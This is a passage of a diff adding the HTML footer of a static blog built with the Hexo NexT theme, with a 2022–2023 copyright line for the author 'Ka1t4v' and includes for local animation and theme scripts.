+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ka1t4v</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
